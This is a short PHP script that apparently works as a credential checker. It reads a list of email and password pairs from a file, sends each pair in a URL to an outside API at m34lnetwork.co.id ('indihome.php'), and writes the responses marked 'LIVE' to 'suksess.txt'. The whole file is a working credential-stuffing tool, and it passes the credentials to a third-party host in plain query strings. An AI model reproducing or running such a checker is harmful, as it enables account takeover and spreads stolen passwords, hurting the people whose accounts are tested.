<?php
function curl($web,$postdata = null,$kue = null){
    $ch = curl_init($web);
    curl_setopt($ch,CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $postdata);
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5);
    curl_setopt($ch, CURLOPT_COOKIEJAR, $kue);
    $page = curl_exec($ch);
    return($page);
}
echo "$ File            ";
$file = trim(fgets(STDIN));
echo "$ Param (| or :)  ";
$param = trim(fgets(STDIN));
$xx = explode("\n", file_get_contents($file));
$count = count($xx);
for($a=0;$a<$count;$a++){
    $x = explode($param,$xx[$a]);
    $email = $x[0];
    $pass = $x[1];
    $c = curl("https://m34lnetwork.co.id/api/indihome.php?mail=$email&pass=$pass");
        echo $c."\n";

if(strpos($c, "LIVE")){
    $h=fopen("suksess.txt","a");
    fwrite($h,$c);
    fwrite($h,"\n");
    fclose($h);
}
}
